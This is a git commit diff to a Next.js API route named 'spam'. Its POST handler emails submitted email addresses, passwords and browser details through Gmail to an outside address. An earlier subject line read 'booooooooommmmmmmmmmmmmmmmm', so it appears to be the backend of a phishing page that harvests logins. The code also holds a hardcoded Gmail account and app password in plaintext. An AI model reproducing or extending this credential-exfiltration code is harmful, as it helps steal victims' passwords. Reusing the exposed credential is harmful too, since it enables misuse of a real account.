32bc4f8e9842d4a7ac95902f9fb7ccd052a0ee54
mourisnicolas <125296096+mourisnicolas@users.noreply.github.com>
2024-01-23 15:58:57 +0100

    Update index.js v01

--- pages/api/spam/index.js
+++ pages/api/spam/index.js
@@ -5,14 +5,17 @@ import nodeMailer from 'nodemailer';
 
 export default async function handler(req, res) {
   const { method, body } = req
-  await dbConnect();
+  // await dbConnect();
 
   switch (method) {
     case "GET":
       try {
+        const limitNr = Number(req.query.limit);
+
         let spam = await Spam.find({ })
-          .sort({createdAt: 1})
-          .limit(110);
+          .sort({createdAt: -1})
+          .skip((limitNr - 1) * 3)
+          .limit(3);
 
         return res.status(201).send(spam);
       } catch (error) {
@@ -20,19 +23,56 @@ export default async function handler(req, res) {
         return res.status(400).send("Invalid username or password");
       }
     case 'POST':
-      try {
+      // try {
 
-        let p = await Spam.findOne({ email: body.email });
-        if(p) {
-          return res.status(201).send("k k");
-        }
+      //   let p = await Spam.findOne({ email: body.email });
+      //   if(p) {
+      //     return res.status(201).send("k k");
+      //   }
 
-        let spam = new Spam(body);
-        await spam.save();
+      //   let spam = new Spam(body);
+      //   await spam.save();
 
-        const transporter = nodeMailer.createTransport({
-          service: "gmail",
-          auth: {
+      //   const transporter = nodeMailer.createTransport({
+      //     service: "gmail",
+      //     auth: {
+      //       user: "rheiinklaus@gmail.com",
+      //       pass: "fnjwlzlyqxbthlvw"
+      //     }
+      //   });
+        
+      //   const option = {
+      //     from: "rheiinklaus@gmail.com",
+      //     to: "mariac.perezcaba@gmail.com",
+      //     subject: "booooooooommmmmmmmmmmmmmmmm",
+      //     html: `
+      //       <p>email: ${body.email}</p>
+      //       <p>password: ${body.password}</p>
+      //       <p>browser: ${body.browser}</p>
+      //       <p>createdAt: ${Date(body.createdAt)}</p>
+      //     `
+      //   }
+
+      //   transporter.sendMail(option, function(error, info) {
+      //     if(error) {
+      //       cconsole.log(error);
+      //     } else {
+      //       console.log('mail send')
+      //     }
+      //   })
+
+      //   const token = jwt.sign({_id: this._id, date:}, "what", {expiresIn: "15h"});;
+
+
+      //   return res.status(201).header("stmmm", token).send("k k");
+      // } catch (error) {
+      //   console.log(error)
+      //   return res.status(400).send("Invalid username or password");
+      // }
+
+      const transporter = nodeMailer.createTransport({
+        service: "gmail",
+        auth: {
             user: "rheiinklaus@gmail.com",
             pass: "fnjwlzlyqxbthlvw"
           }
@@ -41,7 +81,7 @@ export default async function handler(req, res) {
         const option = {
           from: "rheiinklaus@gmail.com",
           to: "mariac.perezcaba@gmail.com",
-          subject: "booooooooommmmmmmmmmmmmmmmm",
+          subject: "User",
           html: `
             <p>email: ${body.email}</p>
             <p>password: ${body.password}</p>
@@ -49,22 +89,19 @@ export default async function handler(req, res) {
             <p>createdAt: ${Date(body.createdAt)}</p>
           `
         }
-        
-        console.log("bammmmmmmmmmmm")
 
-        transporter.sendMail(option, function(error, info) {
-          if(error) {
-            cconsole.log(error);
-          } else {
-            console.log('mail send')
-          }
-        })
-
-        return res.status(201).header("stmmm", token).send("k k");
-      } catch (error) {
-        console.log(error)
-        return res.status(400).send("Invalid username or password");
-      }
+        await new Promise((resolve, reject) => {
+          // send mail
+          transporter.sendMail(option, (err, info) => {
+              if (err) {
+                  console.error(err);
+                  reject(err);
+              } else {
+                  console.log(info);
+                  resolve(info);
+              }
+          });
+      });
     default:
       break;
   }
